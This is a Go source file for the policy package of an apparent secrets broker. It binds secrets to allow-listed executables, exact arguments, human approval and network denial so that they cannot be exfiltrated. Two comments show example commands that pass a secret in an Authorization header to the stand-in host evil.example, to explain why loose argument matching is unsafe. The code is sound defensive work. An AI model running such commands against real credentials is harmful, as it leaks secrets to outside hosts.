// Package policy implements per-item destination binding: a secret may only
// be materialized for allow-listed executables (and optionally hosts).
// This is the anti-exfiltration differentiator — see SPEC.md.
package policy

import (
	"encoding/json"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// ItemPolicy is the allow-list attached to one secret reference.
type ItemPolicy struct {
	Ref  string   `json:"ref"`
	Exec []string `json:"exec"` // absolute argv[0] paths allowed to receive it
	// Args pins the child's argv[1:] exactly; a trailing "..." element opts
	// into prefix matching. Empty means unconstrained, which lets an
	// allow-listed binary be argued into revealing the secret
	// (gh api -H "Authorization: $TOKEN" https://evil.example), so
	// `sb doctor` reports empty Args as a finding.
	Args []string `json:"args,omitempty"`
	// NoArgs pins argv to exactly nothing. It exists because an empty Args
	// cannot be told apart from an absent one after JSON round-tripping, and
	// "allow no arguments" must never silently become "allow any".
	NoArgs bool `json:"no_args,omitempty"`
	// Approve requires a human to authorize each use (Touch ID / password via
	// the system SecurityAgent). This is the one gate an agent cannot satisfy
	// on its own: it can read files and click dialogs, but it cannot produce
	// a fingerprint.
	Approve bool `json:"approve,omitempty"`
	// AgentBrowser opts a ref in to browsers associated with agent scope.
	// Default false: a browser an agent drives gets nothing unless the ref
	// was explicitly marked for it.
	AgentBrowser bool     `json:"agent_browser,omitempty"`
	// Host restricts which web ORIGINS a ref may be filled into by the
	// browser integration (see CheckHost). It is NOT an egress restriction:
	// it does not constrain where an allow-listed executable may send the
	// secret. For that, see Network.
	Host []string `json:"host,omitempty"`
	// Network constrains the child process's network access in
	// exec_with_secret. "" (default) leaves the child unrestricted;
	// NetworkNone denies the child and all its descendants any network
	// access, so a credential spent locally cannot be exfiltrated by the
	// very tool it was released to. Enforced with sandbox-exec on macOS and
	// an empty network namespace on Linux.
	//
	// Per-HOST egress binding is deliberately NOT offered: enforcing it
	// would require terminating the child's TLS, and a hostname allow-list
	// that can be defeated by an IP literal or a redirect would be worse
	// than none. "none" is the honest, enforceable unit.
	//
	// It fails CLOSED: if the platform cannot provide the jail, the exec is
	// refused rather than run unconfined.
	Network string `json:"network,omitempty"`
}

// Network modes for ItemPolicy.Network.
const (
	NetworkUnrestricted = ""     // child may use the network
	NetworkNone         = "none" // child and descendants get no network
)


// Store holds all policies; v0.1 = single JSON file, sidecar-friendly.
type Store struct {
	mu     sync.RWMutex
	items  map[string]ItemPolicy  // ref -> policy
	writes map[string]WritePolicy // adapter prefix -> write policy

	path  string    // file this store was loaded from ("" = in-memory)
	mtime time.Time // modification time as of the last successful load
}

func Load(path string) (*Store, error) {
	s := &Store{items: map[string]ItemPolicy{}, writes: map[string]WritePolicy{}, path: path}
	if fi, err := os.Stat(path); err == nil {
		s.mtime = fi.ModTime()
	}
	b, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return s, nil // empty store is valid: nothing allowed
		}
		return nil, err
	}
	var file struct {
		Items  []ItemPolicy           `json:"items"`
		Writes map[string]WritePolicy `json:"writes"`
	}
	if err := json.Unmarshal(b, &file); err != nil {
		return nil, err
	}
	for _, it := range file.Items {
		s.items[it.Ref] = it
	}
	s.writes = file.Writes
	return s, nil
}

func (s *Store) Upsert(p ItemPolicy) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.items[p.Ref] = p
}

// Check reports whether ref may be given to the executable at path when
// invoked with argv (the child's arguments, excluding argv[0]).
//
// The path is resolved to its absolute form and compared exactly; symlinks
// are resolved (EvalSymlinks) so /bin/sh aliases can't bypass the list.
// If the policy sets Args, argv must start with exactly those elements.
func (s *Store) Check(ref, execPath string, argv []string) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	p, ok := s.items[ref]
	if !ok {
		return false // no policy -> deny by default
	}
	if !execAllowed(p, execPath) {
		return false
	}
	if p.NoArgs {
		return len(argv) == 0
	}
	return argsAllowed(p.Args, argv)
}

func execAllowed(p ItemPolicy, execPath string) bool {
	abs, err := filepath.Abs(execPath)
	if err != nil {
		return false
	}
	if real, err := filepath.EvalSymlinks(abs); err == nil {
		abs = real
	}
	for _, allowed := range p.Exec {
		if allowed == abs {
			return true
		}
		if real, err := filepath.EvalSymlinks(allowed); err == nil && real == abs {
			return true
		}
	}
	return false
}

// argsAllowed matches the child's argv against the policy.
//
//	nil                    any arguments (v0.1 policy files have no args key)
//	["api","--jq",".x"]    exactly those arguments, nothing appended
//	["api","..."]          those arguments followed by anything
//
// Exact is the default because appending is where the exfiltration lives: a
// prefix match on ["api"] happily allows `api -H "Authorization: <secret>"
// https://evil.example`.
func argsAllowed(want, got []string) bool {
	if len(want) == 0 {
		return true
	}
	if want[len(want)-1] == argsEllipsis {
		want = want[:len(want)-1]
		if len(got) < len(want) {
			return false
		}
		got = got[:len(want)]
	}
	if len(want) != len(got) {
		return false
	}
	for i, w := range want {
		if got[i] != w {
			return false
		}
	}
	return true
}

// argsEllipsis opts one policy entry back into prefix matching.
const argsEllipsis = "..."

// ReloadIfChanged re-reads the policy file when its modification time has
// moved. The daemon calls this before each decision: `sb allow` edits used to
// require a restart, which meant an operator could believe a rule was in
// force when it was not.
//
// On any error the last good policy stays in force — sb rewrites the file in
// place, so a read can catch a half-written file, and neither wiping the
// rules nor failing open is acceptable in that window.
func (s *Store) ReloadIfChanged() error {
	if s.path == "" {
		return nil
	}
	fi, err := os.Stat(s.path)
	if err != nil {
		return err
	}
	s.mu.RLock()
	unchanged := fi.ModTime().Equal(s.mtime)
	s.mu.RUnlock()
	if unchanged {
		return nil
	}
	fresh, err := Load(s.path)
	if err != nil {
		return err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.items, s.writes, s.mtime = fresh.items, fresh.writes, fi.ModTime()
	return nil
}

// Refs returns all known refs (for list_secrets metadata).
func (s *Store) Refs() []string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]string, 0, len(s.items))
	for r := range s.items {
		out = append(out, r)
	}
	return out
}

// Get returns a copy of the policy for one ref (ok=false if unknown).
func (s *Store) Get(ref string) (ItemPolicy, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	p, ok := s.items[ref]
	return p, ok
}

// NewEmpty returns an empty store (everything denied by default).
func NewEmpty() *Store {
	return &Store{items: map[string]ItemPolicy{}, writes: map[string]WritePolicy{}}
}

// Remove deletes a ref's policy entirely (back to deny-all).
func (s *Store) Remove(ref string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.items, ref)
}
